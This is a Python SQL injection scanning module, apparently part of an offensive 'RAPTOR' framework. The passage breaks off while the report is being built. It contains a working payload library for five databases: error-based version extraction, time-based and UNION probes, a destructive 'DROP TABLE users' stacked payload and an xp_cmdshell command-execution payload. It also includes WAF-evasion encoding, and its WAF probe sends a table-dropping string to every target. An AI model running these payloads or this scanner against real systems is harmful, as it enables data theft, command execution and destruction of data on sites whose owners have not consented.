#!/usr/bin/env python3
"""
RAPTOR SQL Injection Testing Module v2.0
=========================================
S-tier SQL Injection detection for RAPTOR Framework.
Integrated with core components: StealthManager, DatabaseManager, ReportManager.
"""

import re
import time
import asyncio
import random
from typing import List, Dict, Optional, Set, Tuple
from dataclasses import dataclass, field
from urllib.parse import urljoin, parse_qs, urlparse, quote

from core.base_module import BaseModule, Finding


@dataclass
class SQLiPayload:
    """SQL Injection payload with metadata"""
    payload: str
    technique: str  # error, boolean, time, union, stacked, oob
    db_type: str
    expected_indicator: str
    severity: str
    encoding_chain: List[str] = field(default_factory=list)
    evasion_tags: List[str] = field(default_factory=list)
    success_threshold: float = 0.9


class SQLiTester(BaseModule):
    """
    Advanced SQL Injection detection module for RAPTOR Framework.
    
    Usage:
        async with SQLiTester(config, stealth_manager, db_manager) as module:
            findings = await module.run(target_url, scope='comprehensive')
    """
    
    def __init__(self, config: Dict, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db)
        self.graph = graph_manager
        self.findings: List[Finding] = []
        self.tested_params: Set[str] = set()
        self.db_fingerprints: Dict[str, Dict] = {}
        self.waf_detected: bool = False
        
        # Configuration
        self.time_delay = config.get('blind_timeout', 10)
        self.boolean_threshold = config.get('boolean_diff_threshold', 0.05)
        self.max_union_columns = config.get('max_union_cols', 20)
        self.oob_callback = config.get('oob_callback')
        self.evasion_level = config.get('evasion_level', 3)
        self.rate_limit = config.get('rate_limit', 10)
        
        # Initialize databases
        self.payloads = self._initialize_payloads()
        self.error_signatures = self._load_error_signatures()
        self.db_specific = self._load_db_specific_tests()
        
    def _initialize_payloads(self) -> Dict[str, Dict[str, List[SQLiPayload]]]:
        """Initialize comprehensive SQLi payload database"""
        
        payloads = {
            'error': {
                'mysql': [
                    SQLiPayload("'", 'error', 'mysql', r"SQL syntax.*MySQL", 'High'),
                    SQLiPayload('"', 'error', 'mysql', r"SQL syntax.*MySQL", 'High'),
                    SQLiPayload("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--", 
                              'error', 'mysql', r"XPATH syntax error", 'Critical'),
                    SQLiPayload("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
                              'error', 'mysql', r"XPATH syntax error", 'Critical'),
                ],
                'postgres': [
                    SQLiPayload("'", 'error', 'postgres', r"PostgreSQL.*ERROR", 'High'),
                    SQLiPayload("';", 'error', 'postgres', r"PostgreSQL", 'High'),
                    SQLiPayload("' AND 1=CAST((SELECT version()) AS INTEGER)--",
                              'error', 'postgres', r"invalid input syntax", 'Critical'),
                ],
                'mssql': [
                    SQLiPayload("'", 'error', 'mssql', r"Microsoft.*ODBC.*SQL", 'High'),
                    SQLiPayload("'", 'error', 'mssql', r"SQL Server.*Driver", 'High'),
                    SQLiPayload("' AND 1=@@VERSION--", 'error', 'mssql', r"nvarchar", 'Critical'),
                ],
                'oracle': [
                    SQLiPayload("'", 'error', 'oracle', r"ORA-[0-9]{5}", 'High'),
                    SQLiPayload("' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))--",
                              'error', 'oracle', r"ORA-29257", 'Critical'),
                    SQLiPayload("' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS INT)--",
                              'error', 'oracle', r"ORA-01722", 'Critical'),
                ],
                'sqlite': [
                    SQLiPayload("'", 'error', 'sqlite', r"SQLiteException", 'High'),
                    SQLiPayload("' AND sqlite_version()--", 'error', 'sqlite', r"SQLite", 'High'),
                ],
                'generic': [
                    SQLiPayload("'", 'error', 'generic', r"SQL syntax.*", 'Medium'),
                    SQLiPayload("'--", 'error', 'generic', r"syntax", 'Medium'),
                ]
            },
            'boolean': {
                'generic': [
                    SQLiPayload("' AND '1'='1", 'boolean', 'generic', "true_condition", 'High'),
                    SQLiPayload("' AND '1'='2", 'boolean', 'generic', "false_condition", 'High'),
                    SQLiPayload("' AND 1=1--", 'boolean', 'generic', "true_condition", 'High'),
                    SQLiPayload("' AND 1=2--", 'boolean', 'generic', "false_condition", 'High'),
                ]
            },
            'time': {
                'mysql': [
                    SQLiPayload(f"' AND SLEEP({self.time_delay})--", 'time', 'mysql', "delay", 'High'),
                    SQLiPayload(f"' AND (SELECT * FROM (SELECT(SLEEP({self.time_delay})))a)--", 
                              'time', 'mysql', "delay", 'High'),
                ],
                'postgres': [
                    SQLiPayload(f"'; SELECT pg_sleep({self.time_delay})--", 'time', 'postgres', "delay", 'High'),
                    SQLiPayload(f"' AND (SELECT 1 FROM PG_SLEEP({self.time_delay}))--",
                              'time', 'postgres', "delay", 'High'),
                ],
                'mssql': [
                    SQLiPayload(f"'; WAITFOR DELAY '0:0:{self.time_delay}'--", 'time', 'mssql', "delay", 'High'),
                ],
                'oracle': [
                    SQLiPayload(f"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{self.time_delay})--",
                              'time', 'oracle', "delay", 'High'),
                ],
                'sqlite': [
                    SQLiPayload("' AND randomblob(1000000000)--", 'time', 'sqlite', "cpu_delay", 'High'),
                ]
            },
            'union': {
                'generic': [
                    SQLiPayload("' UNION SELECT NULL--", 'union', 'generic', "union_null", 'Critical'),
                    SQLiPayload("' UNION SELECT NULL,NULL--", 'union', 'generic', "union_null", 'Critical'),
                    SQLiPayload("' UNION SELECT 'RAPTOR','TEST'--", 'union', 'generic', "union_string", 'Critical'),
                ]
            },
            'stacked': {
                'mysql': [
                    SQLiPayload("'; DROP TABLE users--", 'stacked', 'mysql', "stacked", 'Critical'),
                ],
                'postgres': [
                    SQLiPayload("'; DROP TABLE users--", 'stacked', 'postgres', "stacked", 'Critical'),
                ],
                'mssql': [
                    SQLiPayload("'; EXEC xp_cmdshell 'whoami'--", 'stacked', 'mssql', "rce", 'Critical'),
                ],
            }
        }
        
        return payloads
    
    def _load_error_signatures(self) -> Dict[str, List[str]]:
        """Load database error signatures"""
        return {
            'mysql': [
                r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySqlClient\.",
                r"MySqlException", r"SQLSTATE\[\d+\]: Syntax error",
            ],
            'postgres': [
                r"PostgreSQL.*ERROR", r"Warning.*pg_.*", r"Npgsql\.",
                r"PG::Error", r"PSQLException",
            ],
            'mssql': [
                r"Microsoft.*ODBC.*SQL", r"SQL Server.*Driver", r"\[SQL Server\]",
                r"SqlException", r"System.Data.SqlClient.SqlException",
            ],
            'oracle': [
                r"ORA-[0-9]{5}", r"Oracle error", r"Oracle.*Driver",
                r"quoted string not properly terminated",
            ],
            'sqlite': [
                r"SQLiteException", r"sqlite3.OperationalError", r"SQLite.*error",
            ],
            'generic': [
                r"SQL syntax.*", r"syntax error.*SQL", r"unclosed quotation mark",
            ]
        }
    
    def _load_db_specific_tests(self) -> Dict[str, Dict]:
        """Load database-specific exploitation tests"""
        return {
            'mysql': {
                'version_query': "SELECT @@version",
                'user_query': "SELECT user()",
                'db_query': "SELECT database()",
                'comment_styles': ['-- ', '#', '/*'],
            },
            'postgres': {
                'version_query': "SELECT version()",
                'user_query': "SELECT current_user",
                'db_query': "SELECT current_database()",
                'comment_styles': ['--', '/*'],
            },
            'mssql': {
                'version_query': "SELECT @@version",
                'user_query': "SELECT SYSTEM_USER",
                'db_query': "SELECT DB_NAME()",
                'comment_styles': ['--', '/*'],
            },
            'oracle': {
                'version_query': "SELECT banner FROM v$version WHERE ROWNUM=1",
                'user_query': "SELECT user FROM dual",
                'db_query': "SELECT ORA_DATABASE_NAME FROM dual",
                'comment_styles': ['--', '/*'],
            },
            'sqlite': {
                'version_query': "SELECT sqlite_version()",
                'comment_styles': ['--', '/*'],
            }
        }
    
    async def __aenter__(self):
        """Async context manager entry"""
        self.logger.info("🔥 Initializing SQL Injection Testing Module")
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.findings and self.db:
            await self._store_findings()
        return False
    
    async def run(self, target: str, **kwargs) -> List[Finding]:
        """
        Execute SQLi testing against target.
        
        Args:
            target: Target URL
            scope: 'quick', 'standard', 'comprehensive', 'aggressive'
            
        Returns:
            List of Finding objects
        """
        scope = kwargs.get('scope', 'standard')
        self.logger.info(f"🚀 Starting SQLi scan against {target} [Scope: {scope}]")
        
        # Phase 1: Parameter Discovery
        self.logger.info("🔍 Phase 1: Discovering injection points")
        params = await self._discover_parameters(target)
        
        # Phase 2: WAF Detection
        self.logger.info("🛡️ Phase 2: Detecting WAF/IPS")
        await self._detect_waf(target)
        
        # Phase 3: Error-based Detection
        self.logger.info("🎯 Phase 3: Testing Error-based SQLi")
        await self._test_error_based(target, params)
        
        # Phase 4: Boolean-based Blind (standard+)
        if scope in ['standard', 'comprehensive', 'aggressive']:
            self.logger.info("🎯 Phase 4: Testing Boolean-based Blind SQLi")
            await self._test_boolean_based(target, params)
        
        # Phase 5: Time-based Blind (comprehensive+)
        if scope in ['comprehensive', 'aggressive']:
            self.logger.info("⏱️ Phase 5: Testing Time-based Blind SQLi")
            await self._test_time_based(target, params)
        
        # Phase 6: UNION-based (aggressive)
        if scope == 'aggressive':
            self.logger.info("🔗 Phase 6: Testing UNION-based SQLi")
            await self._test_union_based(target, params)
        
        # Phase 7: Header-based
        self.logger.info("📋 Phase 7: Testing Header-based SQLi")
        await self._test_header_sqli(target)
        
        self.logger.info(f"✅ SQLi module complete. Findings: {len(self.findings)}")
        return self.findings
    
    async def _discover_parameters(self, target: str) -> Dict[str, List[str]]:
        """Discover URL parameters"""
        discovered = {'url_params': set(), 'forms': []}
        
        common_params = [
            'id', 'page', 'user', 'search', 'category', 'product',
            'order', 'sort', 'filter', 'q', 'query', 'name',
            'email', 'username', 'password', 'token', 'api_key'
        ]
        
        try:
            resp = await self._make_request(target)
            if resp:
                body = await resp.text()
                
                # Extract links with parameters
                links = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', body)
                for link in links:
                    if '?' in link:
                        parsed = urlparse(link)
                        params = parse_qs(parsed.query)
                        discovered['url_params'].update(params.keys())
                
                # Extract forms
                forms = re.findall(
                    r'<form[^>]*?(?:action=["\']([^"\']*)["\'])?[^>]*>(.*?)</form>',
                    body, re.DOTALL | re.I
                )
                discovered['forms'] = forms
                
        except Exception as e:
            self.logger.debug(f"Parameter discovery error: {e}")
        
        discovered['url_params'].update(common_params)
        discovered['url_params'] = list(discovered['url_params'])
        
        return discovered
    
    async def _detect_waf(self, target: str):
        """Detect WAF/IPS"""
        test_payloads = [
            "' AND 1=1",
            "' OR '1'='1",
            "1; DROP TABLE users--",
        ]
        
        blocked = 0
        for payload in test_payloads:
            try:
                test_url = f"{target}?test={quote(payload)}"
                resp = await self._make_request(test_url)
                
                if resp:
                    if resp.status in [403, 406, 501]:
                        blocked += 1
                    body = await resp.text()
                    if any(x in body.lower() for x in ['blocked', 'waf', 'firewall']):
                        blocked += 1
            except Exception:
                blocked += 1
        
        self.waf_detected = blocked >= 2
        if self.waf_detected:
            self.logger.warning("   WAF/IPS detected - enabling evasion")
    
    async def _test_error_based(self, target: str, params: Dict):
        """Test for Error-based SQLi"""
        url_params = params.get('url_params', [])
        
        for param in url_params:
            if param in self.tested_params:
                continue
            
            self.logger.info(f"   Testing parameter: {param}")
            
            for db_type, payloads in self.payloads['error'].items():
                for payload_obj in payloads:
                    # Apply evasion if WAF detected
                    test_payload = self._apply_evasion(payload_obj.payload) if self.waf_detected else payload_obj.payload
                    
                    try:
                        test_url = f"{target}?{param}={quote(test_payload)}"
                        resp = await self._make_request(test_url)
                        
                        if not resp:
                            continue
                        
                        body = await resp.text()
                        
                        if self._check_error_signatures(body, db_type):
                            # Fingerprint database
                            fingerprint = await self._fingerprint_db(target, param, db_type)
                            
                            finding = self._create_finding(
                                target, param, payload_obj, db_type,
                                'Error-based', body, fingerprint
                            )
                            self.findings.append(finding)
                            self.add_finding(finding)
                            self.tested_params.add(param)
                            break
                            
                    except Exception as e:
                        self.logger.debug(f"Error-based test failed: {e}")
    
    def _apply_evasion(self, payload: str) -> str:
        """Apply basic evasion techniques"""
        # URL double encoding
        if random.choice([True, False]):
            return quote(quote(payload, safe=''), safe='')
        return payload
    
    def _check_error_signatures(self, body: str, db_type: str) -> bool:
        """Check for database error signatures"""
        signatures = self.error_signatures.get(db_type, self.error_signatures['generic'])
        
        for signature in signatures:
            if re.search(signature, body, re.IGNORECASE):
                return True
        
        # Generic SQL error patterns
        generic_patterns = [
            r"sql syntax.*error",
            r"syntax error.*in query",
            r"unclosed quotation mark",
        ]
        
        for pattern in generic_patterns:
            if re.search(pattern, body, re.I):
                return True
        
        return False
    
    async def _fingerprint_db(self, target: str, param: str, db_type: str) -> Dict:
        """Fingerprint database version and capabilities"""
        fingerprint = {
            'db_type': db_type,
            'version': None,
            'techniques': ['error'],
            'confidence': 0.7
        }
        
        tests = self.db_specific.get(db_type, {})
        
        # Try version extraction
        if 'version_query' in tests:
            version_payload = f"' AND 1=CONCAT('RAPTOR',({tests['version_query']}))--"
            try:
                test_url = f"{target}?{param}={quote(version_payload)}"
                resp = await self._make_request(test_url)
                if resp:
                    body = await resp.text()
                    version_match = re.search(r'RAPTOR([\d\.]+)', body)
                    if version_match:
                        fingerprint['version'] = version_match.group(1)
                        fingerprint['confidence'] = 0.9
            except Exception:
                pass
        
        # Test boolean capability
        if await self._test_boolean_capability(target, param):
            fingerprint['techniques'].append('boolean')
        
        # Test time capability
        if await self._test_time_capability(target, param, db_type):
            fingerprint['techniques'].append('time')
        
        return fingerprint
    
    async def _test_boolean_capability(self, target: str, param: str) -> bool:
        """Test if boolean-based blind is possible"""
        try:
            true_url = f"{target}?{param}=1 AND 1=1"
            false_url = f"{target}?{param}=1 AND 1=2"
            
            true_resp = await self._make_request(true_url)
            false_resp = await self._make_request(false_url)
            
            if true_resp and false_resp:
                true_body = await true_resp.text()
                false_body = await false_resp.text()
                
                # Compare responses
                if len(true_body) != len(false_body) or true_body != false_body:
                    return True
        except Exception:
            pass
        return False
    
    async def _test_time_capability(self, target: str, param: str, db_type: str) -> bool:
        """Test if time-based blind is possible"""
        payloads = self.payloads['time'].get(db_type, [])
        if not payloads:
            return False
        
        payload = payloads[0].payload
        try:
            start = time.time()
            await self._make_request(f"{target}?{param}={quote(payload)}")
            elapsed = time.time() - start
            return elapsed >= self.time_delay * 0.8
        except Exception:
            return False
    
    async def _test_boolean_based(self, target: str, params: Dict):
        """Test for Boolean-based Blind SQLi"""
        untested = [p for p in params.get('url_params', []) if p not in self.tested_params]
        
        for param in untested:
            try:
                # Get baseline
                baseline_url = f"{target}?{param}=1"
                baseline_resp = await self._make_request(baseline_url)
                if not baseline_resp:
                    continue
                
                baseline_body = await baseline_resp.text()
                
                # Test true/false conditions
                true_url = f"{target}?{param}=1 AND 1=1"
                false_url = f"{target}?{param}=1 AND 1=2"
                
                true_resp = await self._make_request(true_url)
                false_resp = await self._make_request(false_url)
                
                if true_resp and false_resp:
                    true_body = await true_resp.text()
                    false_body = await false_resp.text()
                    
                    # Analyze differences
                    if self._analyze_boolean_diff(baseline_body, true_body, false_body):
                        finding = self._create_finding(
                            target, param,
                            SQLiPayload("1 AND 1=1", 'boolean', 'unknown', "", 'High'),
                            'unknown', 'Boolean-based Blind', '', {}
                        )
                        self.findings.append(finding)
                        self.add_finding(finding)
                        self.tested_params.add(param)
                        
            except Exception as e:
                self.logger.debug(f"Boolean test error: {e}")
    
    def _analyze_boolean_diff(self, baseline: str, true_resp: str, false_resp: str) -> bool:
        """Analyze boolean response differences"""
        baseline_len = len(baseline)
        true_len = len(true_resp)
        false_len = len(false_resp)
        
        # Check length differences
        true_diff = abs(true_len - baseline_len) / baseline_len if baseline_len > 0 else 0
        false_diff = abs(false_len - baseline_len) / baseline_len if baseline_len > 0 else 0
        
        if true_diff < self.boolean_threshold and false_diff > self.boolean_threshold:
            return True
        
        # Check content equality
        if baseline == true_resp and baseline != false_resp:
            return True
        
        return False
    
    async def _test_time_based(self, target: str, params: Dict):
        """Test for Time-based Blind SQLi"""
        untested = [p for p in params.get('url_params', []) if p not in self.tested_params]
        
        for param in untested:
            for db_type in ['mysql', 'postgres', 'mssql', 'oracle', 'sqlite']:
                payloads = self.payloads['time'].get(db_type, [])
                if not payloads:
                    continue
                
                for payload_obj in payloads:
                    payload = payload_obj.payload
                    
                    try:
                        start = time.time()
                        resp = await self._make_request(f"{target}?{param}={quote(payload)}")
                        elapsed = time.time() - start
                        
                        if elapsed >= self.time_delay * 0.8:
                            # Verify with short delay
                            short_payload = payload.replace(str(self.time_delay), '1')
                            start = time.time()
                            await self._make_request(f"{target}?{param}={quote(short_payload)}")
                            short_elapsed = time.time() - start
                            
                            if short_elapsed < 2 and elapsed >= self.time_delay * 0.8:
                                finding = self._create_finding(
                                    target, param, payload_obj, db_type,
                                    'Time-based Blind', '', {}
                                )
                                self.findings.append(finding)
                                self.add_finding(finding)
                                self.tested_params.add(param)
                                break
                                
                    except Exception:
                        pass
    
    async def _test_union_based(self, target: str, params: Dict):
        """Test for UNION-based SQLi"""
        untested = [p for p in params.get('url_params', []) if p not in self.tested_params]
        
        for param in untested:
            # Enumerate columns
            column_count = await self._enumerate_columns(target, param)
            
            if column_count > 0:
                nulls = ','.join(['NULL'] * column_count)
                union_payload = f"1' UNION SELECT {nulls}--"
                
                try:
                    test_url = f"{target}?{param}={quote(union_payload)}"
                    resp = await self._make_request(test_url)
                    
                    if resp and resp.status == 200:
                        finding = self._create_finding(
                            target, param,
                            SQLiPayload(union_payload, 'union', 'unknown', 
                                       f'columns:{column_count}', 'Critical'),
                            'unknown', 'UNION-based', '', {}
                        )
                        self.findings.append(finding)
                        self.add_finding(finding)
                        self.tested_params.add(param)
                        
                except Exception:
                    pass
    
    async def _enumerate_columns(self, target: str, param: str) -> int:
        """Enumerate number of columns for UNION"""
        for num in range(1, self.max_union_columns + 1):
            test_payload = f"1' ORDER BY {num}--"
            
            try:
                test_url = f"{target}?{param}={quote(test_payload)}"
                resp = await self._make_request(test_url)
                
                if not resp or resp.status != 200:
                    return num - 1
                    
            except Exception:
                return num - 1
        
        return 0
    
    async def _test_header_sqli(self, target: str):
        """Test headers for SQLi"""
        headers = [
            'User-Agent', 'X-Forwarded-For', 'X-Real-IP', 'Referer',
            'X-Forwarded-Host', 'Forwarded', 'X-Originating-IP'
        ]
        
        for header in headers:
            for db_type, payloads in self.payloads['error'].items():
                for payload_obj in payloads[:2]:  # Limit to first 2
                    try:
                        test_headers = {header: payload_obj.payload}
                        resp = await self._make_request(target, headers=test_headers)
                        
                        if resp:
                            body = await resp.text()
                            if self._check_error_signatures(body, db_type):
                                finding = self._create_finding(
                                    target, header, payload_obj, db_type,
                                    'Header-based Error', body, {}
                                )
                                self.findings.append(finding)
                                self.add_finding(finding)
                                return
                                
                    except Exception:
                        pass
    
    def _create_finding(self, target: str, param: str, payload: SQLiPayload,
                       db_type: str, technique: str, evidence_body: str,
                       fingerprint: Dict) -> Finding:
        """Create SQLi Finding object"""
        
        severity_map = {
            'Error-based': 'High',
            'UNION-based': 'Critical',
            'Boolean-based Blind': 'High',
            'Time-based Blind': 'High',
            'Header-based Error': 'High',
            'Stacked': 'Critical'
        }
        
        cvss_map = {
            'Error-based': 8.6,
            'UNION-based': 9.8,
            'Boolean-based Blind': 8.1,
            'Time-based Blind': 8.1,
            'Header-based Error': 8.6,
            'Stacked': 9.8
        }
        
        bounty_map = {
            'Error-based': 3000,
            'UNION-based': 5000,
            'Boolean-based Blind': 4000,
            'Time-based Blind': 4000,
            'Header-based Error': 3000,
            'Stacked': 6000
        }
        
        title = f"[{technique}] SQL Injection in '{param}' parameter ({db_type})"
        
        description = f"""## SQL Injection Vulnerability

**Type:** {technique}
**Parameter:** `{param}`
**Database:** {db_type}
**Severity:** {severity_map.get(technique, 'High')}

### Payload
```sql
{payload.payload}
